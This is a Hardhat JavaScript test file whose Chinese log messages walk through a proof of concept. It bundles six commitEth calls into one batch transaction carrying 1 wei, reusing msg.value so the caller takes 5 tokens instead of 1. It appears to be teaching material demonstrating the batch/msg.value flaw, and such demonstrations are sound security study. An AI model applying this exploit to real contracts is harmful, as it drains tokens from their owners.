const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { abi } = require("../artifacts/contracts/Lock.sol/Lock.json");
const hre = require("hardhat")

describe("Lock", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployOneYearLockFixture() {
    const Lock = await ethers.getContractFactory("Lock");
    const lock = await Lock.deploy(5);

    return { lock };
  }

  describe("Deployment", function () {
    it("Should set the right unlockTime", async function () {
      const { lock } = await loadFixture(deployOneYearLockFixture);
      console.log("逻辑讲解🐷")
      console.log("部署合约时，调用者有0个token，合约地址有5个token");
      console.log("业务逻辑是🐴：当调用者调用commitEth时，调用者会转移1wei到合约地址中，合约地址会转移1个token到调用者地址中");

      console.log("但实际情况是，调用者调用commitEth时，调用者只转移1wei到合约地址中，合约地址转移了5个token到调用者地址中\n");

      console.log("⏰...开始执行测试用例");
      const LockContract = new hre.ethers.Contract(await lock.getAddress(), abi, hre.ethers.provider);
      const call0 = LockContract.interface.encodeFunctionData("commitEth", []);
      const call1 = LockContract.interface.encodeFunctionData("commitEth", []);
      const call2 = LockContract.interface.encodeFunctionData("commitEth", []);
      const call3 = LockContract.interface.encodeFunctionData("commitEth", []);
      const call4 = LockContract.interface.encodeFunctionData("commitEth", []);
      const call5 = LockContract.interface.encodeFunctionData("commitEth", []);
      console.log('🐱调用者调用前的token数量', await lock.balanceOf((await hre.ethers.provider.getSigner()).address))
      /**
       * 1 wei 挖走了 5token
       */
      const tx = await lock.batch([call0, call1, call2, call3, call4, call5], {
        value: 1
      });

      await tx.wait();
      console.log(`🐱调用者调用后的token数量`, await lock.balanceOf((await hre.ethers.provider.getSigner()).address));

      console.log('使用1wei转了5个token到合约地址中')
    });
  });
});
